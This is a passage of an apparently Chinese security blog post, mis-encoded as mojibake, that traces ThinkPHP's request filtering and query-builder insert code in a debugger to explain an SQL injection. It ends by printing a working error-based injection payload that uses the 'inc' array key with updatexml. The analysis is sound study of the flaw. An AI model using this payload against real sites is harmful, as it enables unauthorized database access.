</span></span><span class="line"><span class="cl">            <span class="c1">// å¼ºåˆ¶ç±»å‹è½¬æ¢
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">typeCast</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$type</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç®€å•è¿‡ç¨‹ï¼Œä»å‰é¢å¯ä»¥çœ‹å‡ºæ¥å°±æ˜¯ä¸€äº›åˆ†å‰²æ“ä½œï¼Œåœ¨å‰é¢å‚æ•°çš„å®šä¹‰ä¸­ï¼Œ<code>username/a</code>ä»£è¡¨çš„å°±æ˜¯æ¥æ”¶ä¸€ä¸ªæ•°ç»„ç±»å‹çš„usernameå‚æ•°ï¼Œç®€å•è¯´ä¸€ä¸‹åé¢çš„åˆ†å‰²æ“ä½œï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031028846.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303102802674"
	
	
></p>
<p>å‰é¢æœ‰ä¸€ä¸ªç”¨<code>/</code>åˆ†å‰²ï¼Œè·å–åˆ°äº†å‚æ•°çš„typeï¼Œç„¶åè¿™é‡Œè·å–åˆ°äº†ç”¨<code>.</code>æ¥åˆ†å‰²ï¼Œå…¶å®é€»è¾‘å°±æ˜¯è·å–åˆ°usernameçš„å€¼ï¼Œè¿™é‡Œæ˜¯fupancï¼Œæ‰€ä»¥ä¼šå°†<code>$data</code>å€¼è®¾ç½®æˆäº†fupancï¼Œå¹¶ä¸”è¿™ä¸ªå€¼ä¸æ˜¯ä¸€ä¸ªå®ä¾‹ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šè¿›å…¥åé¢çš„ifæ¡ä»¶ã€‚</p>
<p>ç»§ç»­å¾€åé¢çœ‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031052489.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303105215442"
	
	
></p>
<p>è¿™é‡Œè°ƒç”¨äº†getFilter()å‡½æ•°ï¼Œå°±æ˜¯ä¸€ä¸ªè·å–è¿‡æ»¤å™¨çš„æ“ä½œï¼Œä½†æ˜¯æˆ‘è¿™é‡Œå¹¶æ²¡æœ‰ç‰¹åˆ«è®¾ç½®filterï¼Œæ‰€ä»¥å°±æ˜¯ä¸ºç©ºã€‚</p>
<p>å†åé¢ï¼Œè¿™é‡Œæˆ‘æ˜¯ç›´æ¥ä¼ å‚çš„fupancï¼Œä¸æ˜¯æ•°ç»„ç±»å‹ï¼Œæ‰€ä»¥ä¸hiè¿›å…¥åé¢çš„ifè¯­å¥ï¼Œè€Œåœ¨elseè¯­å¥ä¸­ï¼Œå¯ä»¥çœ‹åˆ°çš„è°ƒç”¨äº†filterValue()å‡½æ•°ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031110558.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303111016512"
	
	
></p>
<p>ç±»çš„ä¼ å‚å¦‚ä¸Šï¼Œç„¶åè°ƒç”¨äº†array_pop()å‡½æ•°ï¼Œå°±æ˜¯å»æ‰æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚ä½†æ˜¯åé¢çš„<code>is_callable</code>å‡½æ•°æ˜¯æ²¡æœ‰é€šè¿‡çš„ï¼Œis_callable()å‡½æ•°å°±æ˜¯åˆ¤å®šæ˜¯å¦å¯ä»¥ä½œä¸ºä¸ºä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œå¾ˆæ˜¾ç„¶è¿™é‡Œä¸è¡Œã€‚è€Œis_scalar()å‡½æ•°ï¼Œå°±æ˜¯æ£€æµ‹æ˜¯å¦æ˜¯ä¸€ä¸ªæ ‡é‡ï¼Œæ ‡é‡å˜é‡æ˜¯æŒ‡é‚£äº›åŒ…å«äº† integerã€floatã€string æˆ– boolean çš„å˜é‡ï¼Œè€Œ arrayã€object å’Œ resource åˆ™ä¸æ˜¯æ ‡é‡ã€‚è¿™é‡Œçš„<code>is_scalar</code>å‡½æ•°è™½ç„¶æ»¡è¶³äº†ï¼Œä½†æ˜¯åé¢çš„<code>is_scalar</code>å‡½æ•°é‡Œé¢å®šä¹‰çš„ifç­‰è¯­å¥éƒ½æ˜¯ä¸æ»¡è¶³çš„ï¼Œæ‰€ä»¥æœ€åä¼šç›´æ¥returnï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031134240.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303113423206"
	
	
></p>
<p>ç„¶åå°±ä¼šè°ƒç”¨åˆ°filterExp()å‡½æ•°ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">filterExp</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// è¿‡æ»¤æŸ¥è¯¢ç‰¹æ®Šå­—ç¬¦
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// TODO å…¶ä»–å®‰å…¨è¿‡æ»¤
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå°±æ˜¯ä¸€ä¸ªsqlæ³¨å…¥çš„é˜²å¾¡æœºåˆ¶ï¼Œå¤§å°å†™åŒ¹é…æ¥æ„å»ºwafï¼Œå¦‚æœåŒ¹é…åˆ°äº†å†…å®¹ï¼Œé‚£ä¹ˆå°±ä¼šç›´æ¥å°†valueåé¢åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œä½†æ˜¯æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªè¿‡æ»¤å¾—æ¯”è¾ƒä¸€èˆ¬å‘€ã€‚</p>
<p>æœ€åè°ƒç”¨å®ŒfilterEXPå’ŒfilterValueå‡½æ•°è¿‡åå°±å›åˆ°äº†input()å‡½æ•°ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031224744.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303122421686"
	
	
></p>
<p>æœ€åæœ‰ä¸€ä¸ªç±»å‹è½¬æ¢ï¼Œè¿™é‡Œå¾—<code>$type</code>å˜é‡å°±æ˜¯åœ¨å‰é¢<code>/</code>åˆ†å‰²é‚£é‡Œåˆ†å‰²å‡ºæ¥çš„ã€‚æœ€åï¼Œç»è¿‡ç±»å‹è½¬æ¢åï¼Œè¿™é‡Œå°±ä¼šå°†dataçš„å€¼å˜æˆä¸€ä¸ªæ•°ç»„å¹¶å°†å…¶è¿”å›ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031226786.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303122633750"
	
	
></p>
<p>ä½†æ˜¯å¦‚æœæˆ‘ç›´æ¥ä¼ å‚æ—¶å°±æ˜¯ä¸€ä¸ªæ•°ç»„å‘¢ï¼Ÿè¿˜æ˜¯ç®€å•æ”¹ä¸€ä¸‹é…ç½®å³å¯ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031229584.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303122938546"
	
	
></p>
<p>ç„¶åå†æ¬¡è°ƒè¯•å³å¯ï¼Œä¸åŒçš„ç‚¹åœ¨äºåœ¨è°ƒç”¨input()æ–¹æ³•æ—¶ï¼Œis_arrayå‡½æ•°åˆ¤æ–­æˆåŠŸï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031234865.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303123422828"
	
	
></p>
<p>ç„¶åä¼šè°ƒç”¨åˆ°array_walk_recursive()å‡½æ•°ï¼Œå…¶å®å°±æ˜¯ä¼šè°ƒç”¨filterValue()å‡½æ•°ï¼Œç®€å•è·Ÿäº†ä¸€ä¸‹ã€‚è¿‡ç¨‹å…¶å®ä¹Ÿæ˜¯å’Œå‰é¢å·®ä¸å¤šçš„ï¼Œä¸€ä¸ªæ£€æµ‹å€¼çš„æ“ä½œï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚æœ€åè°ƒç”¨reset()å‡½æ•°æ¥è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå€¼ï¼Œä¹Ÿå°±æ˜¯fupancï¼Œå¹¶ä¸”åé¢çš„æ“ä½œä¹Ÿæ˜¯å·®ä¸å¤šçš„ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚</p>
<p>ç„¶åå°±åˆ°äº†æ•°æ®åº“è¿æ¥åŠæ’å…¥æ“ä½œäº†ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">db</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">([</span><span class="s1">&#39;username&#39;</span><span class="o">=&gt;</span><span class="nv">$username</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·Ÿè¿›è¿™ä¸ªdb()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031253919.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303125329878"
	
	
></p>
<p>è¿™é‡Œæ˜¯è¿æ¥æ•°æ®åº“ï¼Œå¹¶ä¸”æŒ‡å®šäº†æ•°æ®è¡¨ä¸ºusersè¡¨ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031254510.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303125403478"
	
	
></p>
<p>ç„¶åè°ƒç”¨äº†insert()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041824509.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304182410394"
	
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯è°ƒç”¨äº†parseExpress()æ–¹æ³•ï¼Œè·Ÿäº†ä¸€ä¸‹ï¼Œé‡Œé¢å°±æ˜¯å¯¹optionsè¿™ä¸ªå˜é‡è¿›è¡Œäº†ä¸€ä¸‹å¡«å……æ“ä½œï¼Œåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå…ˆæ˜¯å®šä¹‰äº†ä¸€ä¸ª<code>$options</code>å˜é‡ï¼Œæ˜¯ä¸€ä¸ªæ•°ç»„ç±»å‹ï¼Œç„¶åå°±æ˜¯å¾€è¿™ä¸ªæ•°ç»„ç±»å‹çš„å˜é‡è¿›è¡Œä¸€äº›å¡«å……ï¼Œé‡Œé¢æœ‰å‡ ä¸ªæ˜¯åé¢è¦æåˆ°çš„ç‚¹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041836145.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304183615100"
	
	
></p>
<p>è¿™é‡Œçš„gettable()æ–¹æ³•å¯ä»¥è·å–åˆ°tableçš„åå­—ï¼Œåœ¨è¿™é‡Œå°±æ˜¯usersï¼Œå¹¶ä¸”å°†dataçš„é”®è®¾ç½®ä¸ºäº†ç©ºï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041839357.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304183953320"
	
	
></p>
<p>ç„¶ååé¢æœ‰ä¸€ä¸ªforeachæ“ä½œï¼Œå°†é”®ä¸ºfetch_sqlçš„å€¼è®¾ç½®ä¸ºäº†falseï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041837560.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304183736524"
	
	
></p>
<p>ç„¶ååœ¨è¿™æ–¹æ³•ä¹‹é—´ï¼Œæ˜¯è¿›è¡Œäº†å¾ˆå¤šçš„å¡«å……ï¼Œæœ€åæ˜¯è¿”å›äº†è¿™ä¸ª<code>$option</code>å˜é‡ã€‚</p>
<p>é€€å‡ºäº†parseExpress()æ–¹æ³•ï¼Œç„¶åè°ƒç”¨äº†array_merrge()æ–¹æ³•ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ªåˆå¹¶æ•°ç»„çš„æ“ä½œï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰åˆå¹¶ï¼Ÿå°æ€ªï¼Œdataçš„å€¼è¿˜æ˜¯æ²¡æœ‰æ”¹å˜ã€‚</p>
<p>ç„¶åè°ƒç”¨äº†insert()å‡½æ•°ï¼Œè¿™é‡Œçš„â€œå‘èµ·è€…â€æ˜¯builderå˜é‡ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041849234.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304184946192"
	
	
></p>
<p>çœ‹ä¸€ä¸‹builderå˜é‡çš„å®šä¹‰ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041854181.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304185414142"
	
	
></p>
<p>æ˜¯æ•°æ®åº“Builderå¯¹è±¡å®ä¾‹ï¼ŒåŒæ—¶åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ•°æ®åº“Connectionå¯¹è±¡å®ä¾‹ã€‚ç®€å•åŒºåˆ«å°±æ˜¯ï¼š</p>
<ul>
<li>
<p>Connectionå¯¹è±¡å®ä¾‹æ˜¯è¡¨ç¤ºæ•°æ®åº“çš„è¿æ¥å®ä¾‹ï¼Œå¯ä»¥è¿›è¡Œä¸€äº›ç®€å•çš„SQLæŸ¥è¯¢çš„åŠŸèƒ½ï¼Œä½†æ˜¯éœ€è¦ä¸ºä¸€ä¸ªå®Œæ•´çš„è¯­å¥ã€‚</p>
</li>
<li>
<p>builderå¯¹è±¡å®ä¾‹ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®åº“çš„æŸ¥è¯¢æ„å»ºå™¨ï¼Œç”¨äºåŠ¨æ€ç”Ÿæˆå¤æ‚çš„SQLè¯­å¥ã€‚</p>
</li>
</ul>
<p>ç„¶åå°±ä¼šè°ƒç”¨åˆ°insert()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041913606.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304191340561"
	
	
></p>
<p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªparseData()å‡½æ•°ï¼Œæ­¤æ—¶çš„å‚æ•°ä¼ é€’å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041916883.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304191648846"
	
	
></p>
<p>åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œåœ¨switchéƒ¨åˆ†å¿…é¡»è¦åŒ¹é…åˆ°ï¼Œä¸ç„¶ä¼šç›´æ¥é€€å‡ºå¯¼è‡´ä¸èƒ½æ‰§è¡Œsqlæ‰§è¡Œæ“ä½œï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_object</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">method_exists</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="s1">&#39;__toString&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// å¯¹è±¡æ•°æ®å†™å…¥
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$val</span> <span class="o">=</span> <span class="nv">$val</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$fields</span><span class="p">,</span> <span class="k">true</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;strict&#39;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">&#39;fields not exists:[&#39;</span> <span class="o">.</span> <span class="nv">$key</span> <span class="o">.</span> <span class="s1">&#39;]&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;NULL&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">switch</span> <span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;exp&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;inc&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;+&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;dec&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;-&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_scalar</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// è¿‡æ»¤éæ ‡é‡æ•°æ®
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">===</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="o">-&gt;</span><span class="na">isBind</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$key</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="o">-&gt;</span><span class="na">bind</span><span class="p">(</span><span class="s1">&#39;data__&#39;</span> <span class="o">.</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$val</span><span class="p">,</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$bind</span><span class="p">[</span><span class="nv">$key</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$bind</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">:</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;:data__&#39;</span> <span class="o">.</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œè°ƒç”¨çš„foreachï¼Œä¼šåŒ¹é…åˆ°val[0]ï¼Œä¹Ÿå°±æ˜¯fupancè¿™ä¸ªå€¼ï¼Œåé¢ä¼šè¿›å…¥åˆ°switchçš„è¯­å¥ä¸­ï¼Œç„¶åå°±ä¼šè¿›è¡ŒswitchåŒ¹é…ï¼Œå¦‚æœè¿™é‡Œä¸å‘¢ä¸ªåŒ¹é…åˆ°ï¼Œåé¢ç”±äº<code>is_scalar</code>å‡½æ•°åŒ¹é…æ ‡é‡ï¼Œä¸ä¼šè¿›å…¥ï¼Œå°±ä¼šç›´æ¥è¿”å›ä¸€ä¸ªç©ºæ•°ç»„ï¼ˆ<code>$result</code>ï¼‰ï¼Œç„¶åå†insert()å‡½æ•°ä¸­ç›´æ¥return 0äº†ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseData</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°±ä¸ä¼šæœ‰åé¢çš„æ›¿æ¢æ“ä½œè¿”å›ä¸€ä¸ªæ­£å¸¸çš„sqlè¯­å¥äº†ã€‚</p>
<p>è€Œè¿”å›äº†ä¸€ä¸ª0è¿‡åå‘¢ï¼Œå°±ä¸èƒ½æ‰§ä»»ä½•sqlè¯­å¥äº†ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041926667.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304192648620"
	
	
></p>
<p>å‰é¢çš„åœ¨å¡«å……optionæ—¶æ ‡æ³¨ä¸ºäº†falseï¼Œå‰é¢æåˆ°äº†ï¼Œç„¶åè¿™é‡Œç”±äºresultä¸º0ï¼Œç›´æ¥å°±ä¸ä¼šæ‰§è¡Œåç»­æ“ä½œäº†ã€‚å¯¼è‡´æœ€åçš„sqlè¯­å¥æ’å…¥æ˜¯æ²¡ç”¨çš„ã€‚</p>
<p>ç°åœ¨å†æ¥ä»”ç»†çœ‹ä¸€ä¸‹è¿™ä¸ªPOC:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„ä¼ å‚æ˜¯åŠ ä¸Šäº†ä¸€ä¸ªincçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè½¬æŠ˜ç‚¹å°±æ˜¯åœ¨switchè¯­å¥ï¼Œè¿™é‡Œå†çœ‹çœ‹switchçš„ä»£ç é€»è¾‘ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
